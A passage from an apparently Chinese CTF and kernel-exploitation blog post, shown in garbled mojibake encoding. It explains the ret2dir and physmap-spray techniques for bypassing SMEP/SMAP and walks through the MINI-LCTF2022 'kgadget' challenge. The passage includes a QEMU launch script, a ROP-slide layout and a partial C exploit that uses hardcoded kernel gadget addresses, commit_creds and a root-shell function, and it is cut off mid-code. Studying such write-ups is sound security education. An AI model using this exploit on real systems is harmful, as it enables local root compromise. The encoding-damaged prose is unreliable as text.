TBï¼Œè‡³äºä¸ºä»€ä¹ˆç¼©æ°´äº†é‚£ä¹ˆå¤šé‚£æ˜¯å¦ä¸€ä¸ªæ•…äº‹â€¦</p><p>å½“éœ€è¦ç”¨åˆ°å¤§äº 64 TB çš„å†…å­˜æ—¶ï¼Œå°±è¦å¼€å¯ 5 çº§é¡µè¡¨äº†ï¼Œè¿™ç§æƒ…å†µæ¯”è¾ƒå¤æ‚ï¼Œè¿™é‡Œæˆ‘ä»¬å°±å…ˆä¸æ·±å…¥è®¨è®º</p></blockquote><p>è¿™å—åŒºåŸŸçš„å­˜åœ¨æ„å‘³ç€ï¼šå¯¹äºä¸€ä¸ªè¢«ç”¨æˆ·è¿›ç¨‹ä½¿ç”¨çš„ç‰©ç†é¡µæ¡†ï¼Œ<strong>åŒæ—¶å­˜åœ¨ç€ä¸€ä¸ªç”¨æˆ·ç©ºé—´åœ°å€ä¸å†…æ ¸ç©ºé—´åœ°å€åˆ°è¯¥ç‰©ç†é¡µæ¡†çš„æ˜ å°„</strong>ï¼Œå³æˆ‘ä»¬åˆ©ç”¨è¿™ä¸¤ä¸ªåœ°å€è¿›è¡Œå†…å­˜è®¿é—®æ—¶è®¿é—®çš„æ˜¯åŒä¸€ä¸ªç‰©ç†é¡µæ¡†</p><p>å½“å¼€å¯äº† SMEPã€SMAPã€PXN ç­‰é˜²æŠ¤æ—¶ï¼Œå†…æ ¸ç©ºé—´åˆ°ç”¨æˆ·ç©ºé—´çš„ç›´æ¥è®¿é—®è¢«ç¦æ­¢ï¼Œ<strong>æˆ‘ä»¬æ— æ³•ç›´æ¥ä½¿ç”¨ç±»ä¼¼ ret2usr è¿™æ ·çš„æ”»å‡»æ–¹å¼</strong>ï¼Œä½†åˆ©ç”¨å†…æ ¸çº¿æ€§æ˜ å°„åŒºå¯¹æ•´ä¸ªç‰©ç†åœ°å€ç©ºé—´çš„æ˜ å°„ï¼Œ<strong>æˆ‘ä»¬å¯ä»¥åˆ©ç”¨ä¸€ä¸ªå†…æ ¸ç©ºé—´ä¸Šçš„åœ°å€è®¿é—®åˆ°ç”¨æˆ·ç©ºé—´çš„æ•°æ®ï¼Œä»è€Œç»•è¿‡ SMEPã€SMAPã€PXN ç­‰ä¼ ç»Ÿçš„éš”ç»ç”¨æˆ·ç©ºé—´ä¸å†…æ ¸ç©ºé—´çš„é˜²æŠ¤æ‰‹æ®µ</strong></p><p>ä¸‹å›¾ä¾¿æ˜¯åŸè®ºæ–‡ä¸­å¯¹ ret2dir è¿™ç§æ”»å‡»çš„ç¤ºä¾‹ï¼Œæˆ‘ä»¬åœ¨ç”¨æˆ·ç©ºé—´ä¸­å¸ƒç½®çš„ gadget å¯ä»¥é€šè¿‡ direct mapping area ä¸Šçš„åœ°å€<strong>åœ¨å†…æ ¸ç©ºé—´ä¸­è®¿é—®åˆ°</strong></p><p><a href="https://s2.loli.net/2022/05/15/2QMrXEh9qLymCoK.png"><img src="https://s2.loli.net/2022/05/15/2QMrXEh9qLymCoK.png" alt="image.png"></a></p><p>ä½†éœ€è¦æ³¨æ„çš„æ˜¯<strong>åœ¨æ–°ç‰ˆçš„å†…æ ¸å½“ä¸­ direct mapping area å·²ç»ä¸å†å…·æœ‰å¯æ‰§è¡Œæƒé™</strong>ï¼Œå› æ­¤æˆ‘ä»¬å¾ˆéš¾å†åœ¨ç”¨æˆ·ç©ºé—´ç›´æ¥å¸ƒç½® shellcode è¿›è¡Œåˆ©ç”¨ï¼Œ<strong>ä½†æˆ‘ä»¬ä»èƒ½é€šè¿‡åœ¨ç”¨æˆ·ç©ºé—´å¸ƒç½® ROP é“¾çš„æ–¹å¼å®Œæˆåˆ©ç”¨</strong></p><p><a href="https://s2.loli.net/2022/05/15/CP4h5UA2svuwKbJ.png"><img src="https://s2.loli.net/2022/05/15/CP4h5UA2svuwKbJ.png" alt="image.png"></a></p><blockquote><p>åŸºæœ¬ä¸Šå¸ƒç½® shellcode çš„æ–¹æ³•å·²ç»å¾ˆéš¾ç›´æ¥å®Œæˆåˆ©ç”¨äº†ï¼Œæ¯•ç«Ÿè¿™æ˜¯ä¸€ç¯‡14å¹´çš„å¤è€è®ºæ–‡ï¼Œç¨å¾®æ–°ä¸€ç‚¹çš„å†…æ ¸çš„ direct mapping area éƒ½ä¸å†å…·æœ‰å¯æ‰§è¡Œæƒé™â€¦</p></blockquote><p>æ¯”è¾ƒæœ´ç´ çš„ä¸€ç§ä½¿ç”¨ ret2dir è¿›è¡Œæ”»å‡»çš„æ‰‹æ³•ä¾¿æ˜¯ï¼š</p><ul><li>åˆ©ç”¨ mmap åœ¨ç”¨æˆ·ç©ºé—´å¤§é‡å–·å°„å†…å­˜</li><li>åˆ©ç”¨æ¼æ´æ³„éœ²å‡ºå†…æ ¸çš„â€œå †â€ä¸Šåœ°å€ï¼ˆé€šè¿‡ kmalloc è·å–åˆ°çš„åœ°å€ï¼‰ï¼Œ<strong>è¿™ä¸ªåœ°å€ç›´æ¥æ¥è‡ªäºçº¿æ€§æ˜ å°„åŒº</strong></li><li>åˆ©ç”¨æ³„éœ²å‡ºçš„å†…æ ¸çº¿æ€§æ˜ å°„åŒºçš„åœ°å€<strong>è¿›è¡Œå†…å­˜æœç´¢</strong>ï¼Œä»è€Œæ‰¾åˆ°æˆ‘ä»¬åœ¨ç”¨æˆ·ç©ºé—´å–·å°„çš„å†…å­˜</li></ul><p><strong>æ­¤æ—¶æˆ‘ä»¬å°±è·å¾—äº†ä¸€ä¸ªæ˜ å°„åˆ°ç”¨æˆ·ç©ºé—´çš„å†…æ ¸ç©ºé—´åœ°å€ï¼Œæˆ‘ä»¬é€šè¿‡è¿™ä¸ªå†…æ ¸ç©ºé—´åœ°å€ä¾¿èƒ½ç›´æ¥è®¿é—®åˆ°ç”¨æˆ·ç©ºé—´çš„æ•°æ®ï¼Œä»è€Œé¿å¼€äº†ä¼ ç»Ÿçš„éš”ç»ç”¨æˆ·ç©ºé—´ä¸å†…æ ¸ç©ºé—´çš„é˜²æŠ¤æ‰‹æ®µ</strong></p><p>éœ€è¦æ³¨æ„çš„æ˜¯æˆ‘ä»¬å¾€å¾€æ²¡æœ‰å†…å­˜æœç´¢çš„æœºä¼šï¼Œå› æ­¤éœ€è¦<strong>ä½¿ç”¨ mmap å–·å°„å¤§é‡çš„ç‰©ç†å†…å­˜å†™å…¥åŒæ ·çš„ payload</strong>ï¼Œä¹‹åå†éšæœºæŒ‘é€‰ä¸€ä¸ªçº¿æ€§æ˜ å°„åŒºä¸Šçš„åœ°å€è¿›è¡Œåˆ©ç”¨ï¼Œè¿™æ ·æˆ‘ä»¬å°±<strong>æœ‰å¾ˆå¤§çš„æ¦‚ç‡å‘½ä¸­åˆ°æˆ‘ä»¬å¸ƒç½®çš„ payload ä¸Š</strong>ï¼Œè¿™ç§æ”»å‡»æ‰‹æ³•ä¹Ÿç§°ä¸º <code>physmap spray</code></p><blockquote><p>è¿˜æ˜¯å»ºè®®å¤§å®¶æŠŠè®ºæ–‡åŸæ–‡çœ‹ä¸€é23333</p></blockquote><h2 id="ä¾‹é¢˜ï¼šMINI-LCTF2022-kgadget"><a href="#ä¾‹é¢˜ï¼šMINI-LCTF2022-kgadget" class="headerlink" title="ä¾‹é¢˜ï¼šMINI-LCTF2022 - kgadget"></a>ä¾‹é¢˜ï¼šMINI-LCTF2022 - kgadget</h2><blockquote><p>ç¬”è€…åœ¨æ ¡å†…èµ›å‡ºçš„ä¸€é“é¢˜ç›®ï¼Œç®—æ˜¯ä¸€é“ ret2dir çš„ä¾‹é¢˜ï¼Œ<del>å› ä¸ºç½‘ä¸Šå®åœ¨æ˜¯æ²¡æœ‰è¿™ä¸€å—çš„é¢˜ç›®â€¦</del></p><p><a href="https://arttnba3.cn/download/minil2022/pwn/kgadget.tar.xz">ç‚¹å‡»ä¸‹è½½-kgadget.tar.xz</a></p></blockquote><h3 id="åˆ†æ-1"><a href="#åˆ†æ-1" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>è¿˜æ˜¯æƒ¯ä¾‹çš„ç»™äº†ä¸ªæœ‰æ¼æ´çš„é©±åŠ¨ï¼Œé€†èµ·æ¥å…¶å®å¹¶ä¸éš¾ï¼Œå”¯ä¸€æœ‰ç”¨çš„å°±æ˜¯ ioctlï¼Œè‹¥ ioctl çš„ç¬¬äºŒä¸ªå‚æ•°ä¸º 114514 åˆ™ä¼šå°†ç¬¬ä¸‰ä¸ªå‚æ•°ä½œä¸ºæŒ‡é’ˆè¿›è¡Œè§£å¼•ç”¨ï¼Œå–å…¶æ‰€æŒ‡åœ°å€ä¸Šå€¼ä½œä¸ºå‡½æ•°æŒ‡é’ˆè¿›è¡Œæ‰§è¡Œï¼ˆè¿™é‡Œç¼–è¯‘å™¨å°†å…¶ä¼˜åŒ–ä¸º <code>__x86_indirect_thunk_rbx()</code> ï¼Œå…¶å®æœ¬è´¨ä¸Šå°±æ˜¯ <code>call rbx</code> ï¼‰</p><p><a href="https://s2.loli.net/2022/05/07/WyuTvUgxO1nQKGa.png"><img src="https://s2.loli.net/2022/05/07/WyuTvUgxO1nQKGa.png" alt="image.png"></a></p><p>åœ¨å¯åŠ¨è„šæœ¬ä¸­å¼€å¯äº† smep ä¸ smap ä¿æŠ¤ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¸èƒ½å¤Ÿç›´æ¥åœ¨ç”¨æˆ·ç©ºé—´æ„é€  rop ç„¶å ret2usrï¼Œä½†æ˜¯ç”±äºæ²¡æœ‰å¼€å¯ kaslrï¼Œæ‰€ä»¥æˆ‘ä»¬ä¹Ÿä¸éœ€è¦æ³„éœ²å†…æ ¸åŸºå€</p><figure class="highlight sh"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs SH"><span class="hljs-meta">#!/bin/sh</span><br>qemu-system-x86_64 \<br>    -m 128M \<br>    -cpu kvm64,+smep,+smap \<br>    -smp cores=2,threads=2 \<br>    -kernel bzImage \<br>    -initrd ./rootfs.cpio \<br>    -nographic \<br>    -monitor /dev/null \<br>    -snapshot \<br>    -append <span class="hljs-string">&quot;console=ttyS0 nokaslr pti=on quiet oops=panic panic=1&quot;</span> \<br>    -no-reboot<br></code></pre></div></td></tr></table></figure><h3 id="æ¼æ´åˆ©ç”¨ï¼šret2dir-physmap-spray"><a href="#æ¼æ´åˆ©ç”¨ï¼šret2dir-physmap-spray" class="headerlink" title="æ¼æ´åˆ©ç”¨ï¼šret2dir + physmap spray"></a>æ¼æ´åˆ©ç”¨ï¼šret2dir + physmap spray</h3><p>å› ä¸ºæˆ‘ä»¬æ²¡æ³•ç›´æ¥åœ¨å†…æ ¸ç©ºé—´ç›´æ¥æ‰¾åˆ°ä¸€ä¸ªè¿™æ ·çš„ç›®æ ‡ï¼ˆå†…æ ¸ç©ºé—´ä¸­è™½ç„¶å­˜åœ¨èƒ½å¤Ÿè¿™æ ·è¿›è¡Œè°ƒç”¨çš„å‡½æ•°æŒ‡é’ˆï¼Œä¾‹å¦‚ tty è®¾å¤‡é»˜è®¤çš„å‡½æ•°è¡¨<code>ptm_unix98_ops</code> ä¸€ç±»çš„ï¼Œä½†æ˜¯è¿™äº›å‡½æ•°è¡¨å¯¹åº”çš„å‡½æ•°æŒ‡é’ˆå¯¹æˆ‘ä»¬æ¥è¯´æ²¡æœ‰ç”¨ï¼‰ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦æ‰‹åŠ¨å»<strong>åœ¨å†…æ ¸ç©ºé—´å¸ƒç½®æˆ‘ä»¬çš„å‡½æ•°æŒ‡é’ˆä¸ rop chain</strong>ï¼Œä¹‹åæˆ‘ä»¬ä¼ å…¥æˆ‘ä»¬å¸ƒç½®çš„ gadget çš„åœ°å€å°±èƒ½è¿›è¡Œåˆ©ç”¨äº†</p><p>é‚£ä¹ˆæˆ‘ä»¬å¦‚ä½•åœ¨å†…æ ¸ç©ºé—´å¸ƒç½®æˆ‘ä»¬çš„æ¶æ„æ•°æ®å‘¢ï¼Ÿå¯èƒ½æœ‰çš„äººå°±ä¼šæƒ³åˆ° <code>msg_msg</code> ã€<code>sk_buff</code> ç­‰ä¸€ç³»åˆ—å¸¸ç”¨æ¥è¿›è¡Œå †å–·çš„ç»“æ„ä½“ï¼Œ<strong>ä½†å…¶å®æˆ‘ä»¬å¹¶ä¸éœ€è¦æ˜¾å¼åœ°åœ¨å†…æ ¸ç©ºé—´å¸ƒç½®æ•°æ®ï¼Œè€Œæ˜¯å¯ä»¥é€šè¿‡ä¸€ä¸ªä½äºå†…æ ¸ç©ºé—´ä¸­çš„åœ°å€ç›´æ¥è®¿é—®åˆ°ç”¨æˆ·ç©ºé—´ä¸­çš„æ•°æ®</strong>â€”â€”é‚£å°±æ˜¯æ˜ å°„äº†æ•´ä¸ªç‰©ç†å†…å­˜çš„ <code>direct mapping area</code></p><p>æˆ‘ä»¬ä¸éš¾æƒ³åˆ°çš„æ˜¯ï¼Œ<strong>æˆ‘ä»¬ä¸ºç”¨æˆ·ç©ºé—´æ‰€åˆ†é…çš„æ¯ä¸€å¼ å†…å­˜é¡µï¼Œåœ¨å†…æ ¸ç©ºé—´ä¸­éƒ½èƒ½é€šè¿‡è¿™å—å†…å­˜åŒºåŸŸè®¿é—®åˆ°</strong>ï¼Œå› æ­¤æˆ‘ä»¬åªéœ€è¦åœ¨ç”¨æˆ·ç©ºé—´å¸ƒç½®æ¶æ„æ•°æ®ï¼Œä¹‹åå†åœ¨å†…æ ¸ç©ºé—´çš„è¿™å—åŒºåŸŸä¸­æ‰¾åˆ°æˆ‘ä»¬çš„ç”¨æˆ·ç©ºé—´æ•°æ®å¯¹åº”çš„å†…æ ¸ç©ºé—´åœ°å€å³å¯ï¼Œè¿™ä¾¿æ˜¯ <code>ret2dir</code> â€”â€”<strong>é€šè¿‡å†…æ ¸ç©ºé—´åœ°å€è®¿é—®åˆ°ç”¨æˆ·ç©ºé—´æ•°æ®</strong></p><blockquote><p>å½“ç„¶ï¼Œä½¿ç”¨ <code>msg_msg</code> æˆ–è€… <code>sk_buff</code> åœ¨å†…æ ¸ç©ºé—´ä¸­å¸ƒç½®æ¶æ„æ•°æ®ä¹Ÿå¯ä»¥ï¼Œä¸è¿‡åœ¨ç¬”è€…çœ‹æ¥å¯¹è¿™é¢˜è€Œè¨€æ˜¯å¤šæ­¤ä¸€ä¸¾â€¦</p></blockquote><p>é‚£ä¹ˆç°åœ¨åˆå‡ºç°ä¸€ä¸ªæ–°çš„é—®é¢˜ï¼Œ<strong>æˆ‘ä»¬å¦‚ä½•å¾—çŸ¥æˆ‘ä»¬å¸ƒç½®çš„æ¶æ„æ•°æ®åœ¨å†…æ ¸ç©ºé—´ä¸­çš„å¯¹åº”åœ°å€å‘¢ï¼Ÿ</strong>æˆ‘ä»¬æ— æ³•è¿›è¡Œå†…æ ¸ç©ºé—´ä¸­çš„å†…å­˜æœç´¢ï¼Œå› æ­¤ä¹Ÿå°±æ— æ³•ç›´æ¥å¾—çŸ¥æˆ‘ä»¬å¸ƒç½®çš„æ¶æ„æ•°æ®åœ¨å†…æ ¸ç©ºé—´ä¸­çš„åœ°å€</p><p><strong>ç­”æ¡ˆæ˜¯ä¸éœ€è¦æœç´¢</strong>ï¼Œè¿™é‡Œæˆ‘ä»¬ä½¿ç”¨<a href="http://www.cs.columbia.edu/~vpk/papers/ret2dir.sec14.pdf">åŸè®ºæ–‡</a>ä¸­çš„ä¸€ç§åä¸º <code>physmap spray</code> çš„æ”»å‡»æ‰‹æ³•â€”â€”<strong>ä½¿ç”¨ mmap å–·å°„å¤§é‡çš„ç‰©ç†å†…å­˜å†™å…¥åŒæ ·çš„ payload</strong>ï¼Œä¹‹åå†éšæœºæŒ‘é€‰ä¸€ä¸ª direct mapping area ä¸Šçš„åœ°å€è¿›è¡Œåˆ©ç”¨ï¼Œè¿™æ ·æˆ‘ä»¬å°±<strong>æœ‰å¾ˆå¤§çš„æ¦‚ç‡å‘½ä¸­åˆ°æˆ‘ä»¬å¸ƒç½®çš„ payload ä¸Š</strong></p><p>ç»ç¬”è€…å®æµ‹å½“æˆ‘ä»¬å–·å°„çš„å†…å­˜é¡µæ•°é‡è¾¾åˆ°ä¸€å®šæ•°é‡çº§æ—¶<strong>æˆ‘ä»¬æ€»èƒ½å‡†ç¡®åœ°åœ¨ direct mapping area é ä¸­åéƒ¨çš„åŒºåŸŸå‘½ä¸­æˆ‘ä»¬çš„æ¶æ„æ•°æ®</strong></p><p>æœ€åå°±æ˜¯ gadget çš„æŒ‘é€‰ä¸ rop chain çš„æ„é€ äº†ï¼Œæˆ‘ä»¬ä¸éš¾æƒ³åˆ°çš„æ˜¯å¯ä»¥é€šè¿‡å½¢å¦‚ <code>add rsp, val ; ret</code> çš„ gadget è·³è½¬åˆ°å†…æ ¸æ ˆä¸Šçš„ <code>pt_regs</code> ä¸Šï¼Œåœ¨ä¸Šé¢å¸ƒç½®ææƒçš„ rop chainï¼Œä½†åœ¨æœ¬é¢˜å½“ä¸­ <code>pt_regs</code> åªæœ‰ r9 ä¸ r8 ä¸¤ä¸ªå¯„å­˜å™¨å¯ç”¨ï¼Œç¬”è€…æå‰å¯¹å†…æ ¸æ ˆè¿›è¡Œäº†æ¸…ç†â€”â€”</p><p><a href="https://s2.loli.net/2022/05/07/xik67DJWKez9FNl.png"><img src="https://s2.loli.net/2023/02/06/iNdgfh1LPs7aStx.png" alt="image.png"></a></p><blockquote><p>ç¼–è¯‘å™¨ä¼˜åŒ–æˆäº† qmemcpyï¼Œå…¶å®ç¬”è€…æºç é‡Œæ˜¯é€ä¸ªå¯„å­˜å™¨èµ‹å€¼çš„</p></blockquote><p>ä½†å…¶å®ä»…æœ‰ä¸¤ä¸ªå¯„å­˜å™¨ä¹Ÿå¤Ÿç”¨äº†ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨ <code>pop_rsp ; ret</code> çš„ gadget è¿›è¡Œæ ˆè¿ç§»ï¼Œ<strong>å°†æ ˆè¿ç§»åˆ°æˆ‘ä»¬åœ¨ç”¨æˆ·ç©ºé—´æ‰€å¸ƒç½®çš„æ¶æ„æ•°æ®ä¸Š</strong>ï¼Œéšåæˆ‘ä»¬ç›´æ¥åœ¨æ¶æ„æ•°æ®é åçš„ä½ç½®å¸ƒç½®ææƒé™è½å›ç”¨æˆ·æ€çš„ rop chain å³å¯</p><p>ç”±äº buddy system ä»¥é¡µä¸ºå•ä½è¿›è¡Œå†…å­˜åˆ†é…ï¼Œæ‰€ä»¥ç¬”è€…ä¹Ÿä»¥é¡µä¸ºå•ä½è¿›è¡Œ physmap sprayï¼Œä»¥æ±‚èƒ½æ¶ˆè€—æ›´å¤šçš„ç‰©ç†å†…å­˜ï¼Œæé«˜å‘½ä¸­ç‡ï¼Œè¿™é‡Œç¬”è€…æ‡’å¾—å»è®¡ç®—åç§»äº†ï¼Œæ‰€ä»¥åœ¨æ¯å¼ å†…å­˜é¡µä¸Šå¸ƒç½®çš„éƒ½æ˜¯â€œä¸‰æ®µå¼â€çš„ rop chainï¼Œå°†æˆ‘ä»¬è·³è½¬åˆ° <code>pt_regs</code> çš„ gadget åŒæ—¶ç”¨ä½œ slide codeâ€”â€”</p><figure class="highlight asciidoc"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs ASCIIDOC"><span class="hljs-code">------------------------</span><br><span class="hljs-code">add rsp, val ; ret </span><br><span class="hljs-code">add rsp, val ; ret </span><br><span class="hljs-code">add rsp, val ; ret </span><br><span class="hljs-code">add rsp, val ; ret</span><br><span class="hljs-code">...</span><br><span class="hljs-code">add rsp, val ; ret # è¯¥gadgetå¿…å®šä¼šå‘½ä¸­ä¸‹ä¸€ä¸ªåŒºåŸŸä¸­çš„ä¸€æ¡retï¼Œä¹‹åä¾¿èƒ½å¹³ç¼“åœ°â€œæ»‘â€åˆ°å¸¸è§„çš„ææƒ rop ä¸Š</span><br><span class="hljs-code">------------------------</span><br>ret<br>ret<br><span class="hljs-bullet">...</span><br><span class="hljs-bullet"></span><span class="hljs-section">ret</span><br><span class="hljs-section">------------------------</span><br><span class="hljs-section">common root ROP chain</span><br><span class="hljs-section">------------------------</span><br></code></pre></div></td></tr></table></figure><h3 id="final-exploit"><a href="#final-exploit" class="headerlink" title="final exploit"></a>final exploit</h3><p>æœ€åçš„ exp å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/mman.h&gt;</span></span><br><br><span class="hljs-keyword">size_t</span>  prepare_kernel_cred = <span class="hljs-number">0xffffffff810c9540</span>;<br><span class="hljs-keyword">size_t</span>  commit_creds = <span class="hljs-number">0xffffffff810c92e0</span>;<br><span class="hljs-keyword">size_t</span>  init_cred = <span class="hljs-number">0xffffffff82a6b700</span>;<br><span class="hljs-keyword">size_t</span>  pop_rdi_ret = <span class="hljs-number">0xffffffff8108c6f0</span>;<br><span class="hljs-keyword">size_t</span>  pop_rax_ret = <span class="hljs-number">0xffffffff810115d4</span>;<br><span class="hljs-keyword">size_t</span>  pop_rsp_ret = <span class="hljs-number">0xffffffff811483d0</span>;<br><span class="hljs-keyword">size_t</span>  swapgs_restore_regs_and_return_to_usermode = <span class="hljs-number">0xffffffff81c00fb0</span> + <span class="hljs-number">27</span>;<br><span class="hljs-keyword">size_t</span>  add_rsp_0xe8_pop_rbx_pop_rbp_ret = <span class="hljs-number">0xffffffff812bd353</span>;<br><span class="hljs-keyword">size_t</span>  add_rsp_0xd8_pop_rbx_pop_rbp_ret = <span class="hljs-number">0xffffffff810e7a54</span>;<br><span class="hljs-keyword">size_t</span>  add_rsp_0xa0_pop_rbx_pop_r12_pop_r13_pop_rbp_ret = <span class="hljs-number">0xffffffff810737fe</span>;<br><span class="hljs-keyword">size_t</span>  ret = <span class="hljs-number">0xffffffff8108c6f1</span>;<br><br><span class="hljs-keyword">void</span>    (*kgadget_ptr)(<span class="hljs-keyword">void</span>);<br><span class="hljs-keyword">size_t</span>  *physmap_spray_arr[<span class="hljs-number">16000</span>];<br><span class="hljs-keyword">size_t</span>  page_size;<br><span class="hljs-keyword">size_t</span>     try_hit;<br><span class="hljs-keyword">int</span>     dev_fd;<br><br><span class="hljs-keyword">size_t</span> user_cs, user_ss, user_rflags, user_sp;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">saveStatus</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    __asm__(<span class="hljs-string">&quot;mov user_cs, cs;&quot;</span><br>            <span class="hljs-string">&quot;mov user_ss, ss;&quot;</span><br>            <span class="hljs-string">&quot;mov user_sp, rsp;&quot;</span><br>            <span class="hljs-string">&quot;pushf;&quot;</span><br>            <span class="hljs-string">&quot;pop user_rflags;&quot;</span><br>            );<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m\n&quot;</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">errExit</span><span class="hljs-params">(<span class="hljs-keyword">char</span> * msg)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Error : \033[0m%s\n&quot;</span>, msg);<br>    <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">getRootShell</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;   <br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Backing from the kernelspace.\033[0m&quot;</span>);<br><br>    <span class="hljs-keyword">if</span>(getuid())<br>    &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successful to get the root. Execve root shell now...\033[0m&quot;</span>);<br>    system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<span class="hljs-comment">// to exit the process normally instead of segmentation fault</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">constructROPChain</span><span class="hljs-params">(<span class="hljs-keyword">size_t</span> *rop)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> idx = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-comment">// gadget to trigger pt_regs and for slide</span><br>    <span class="hljs-keyword">for</span> (; idx &lt; (page_size / <span class="hljs-number">8</span> - <span class="hljs-number">0x30</span>); idx++)<br>        rop[idx] = add_rsp_0xa0_pop_rbx_pop_r12_pop_r13_pop_rbp_ret;<br><br>    <span class="hljs-comment">// more normal slide code</span><br>    <span class="hljs-keyword">for</span> (; idx &lt; (page_size / <span class="hljs-number">8</span> - <span class="hljs-number">0x10</span>); idx++)<br>        rop[idx] = 